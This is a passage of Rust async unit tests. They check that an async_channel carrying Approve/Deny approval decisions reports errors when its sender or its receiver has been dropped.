        tx.send(ApprovalDecision::Deny).await.unwrap();
    }

    #[tokio::test]
    async fn test_async_channel_closed_sender() {
        let (tx, rx) = async_channel::bounded::<ApprovalDecision>(1);

        drop(tx); // Close sender

        // Receive should fail
        assert!(rx.recv().await.is_err());
    }

    #[tokio::test]
    async fn test_async_channel_closed_receiver() {
        let (tx, rx) = async_channel::bounded::<ApprovalDecision>(1);

        drop(rx); // Close receiver

        // Send should fail
        assert!(tx.send(ApprovalDecision::Approve).await.is_err());
    }
}
